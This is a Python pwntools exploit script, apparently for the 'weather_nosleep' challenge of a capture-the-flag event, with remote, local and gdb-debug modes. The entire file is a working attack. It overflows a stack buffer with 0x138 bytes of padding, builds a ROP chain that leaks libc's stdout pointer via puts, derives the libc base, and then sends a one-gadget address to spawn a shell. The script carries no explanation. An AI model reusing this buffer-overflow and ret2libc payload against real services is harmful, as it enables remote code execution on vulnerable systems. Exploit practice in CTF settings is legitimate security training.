#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./weather_nosleep"

rhp1 = {"host":"challs.xmas.htsp.ro","port":12002}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

onegadgets = [0x4f2c5,0x4f322,0x10a38c]

main = 0x4010a0
pop_rdi = 0x401263
puts_plt = 0x4005c0
printf_plt = 0x4005d0
stdout = 0x602060
stdout_off = 0x3ec760

num = 0

def exploit(conn):
  global num

  conn.recvuntil("name? ")
  inj = "A"*0x138
  inj += p64(pop_rdi)
  inj += p64(stdout)
  inj += p64(puts_plt)
  inj += p64(main)
  conn.sendline(inj)
  a = conn.recvuntil("\n")
  print(a)
  if "Hello" not in a:
    num += 1
    print(hex(num))
    conn = remote(rhp1["host"],rhp1["port"])
    exploit(conn)
    conn.interactive()
  a = conn.recvuntil("\n")
  print(a)
  if "Good bye" not in a:
    num += 1
    print(hex(num))
    conn = remote(rhp1["host"],rhp1["port"])
    exploit(conn)
    conn.interactive()
  stdout_libc = unpack(conn.recv(6).ljust(8,'\x00'))
  print("[+]stdout_libc: "+hex(stdout_libc))
  libc_base = stdout_libc - stdout_off
  print("[+]libc_base: "+hex(libc_base))
  conn.interactive()

  conn.recvuntil("name? ")
  inj = "A"*0x138
  inj += p64(libc_base + onegadgets[2])
  conn.sendline(inj)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

